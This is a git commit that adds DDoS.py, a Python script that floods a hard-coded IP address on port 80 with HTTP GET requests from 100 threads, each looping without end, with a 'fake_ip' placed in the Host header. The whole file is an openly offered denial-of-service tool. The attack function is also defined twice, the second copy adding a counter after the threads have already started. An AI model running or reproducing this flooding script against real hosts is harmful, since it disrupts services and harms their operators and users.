52e35f81bd1db2162e8c8ca38ca36787f91d347f
MCL7D9 <101371148+MCL7D9@users.noreply.github.com>
2022-04-15 08:41:43 +0800

    Create DDoS.py

---
+++ DDoS.py
@@ -0,0 +1,35 @@
+import socket
+import threading
+
+
+target = '104.26.12.138'
+fake_ip = '182.21.20.32'
+port = 80
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close() 
+
+for i in range(100):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
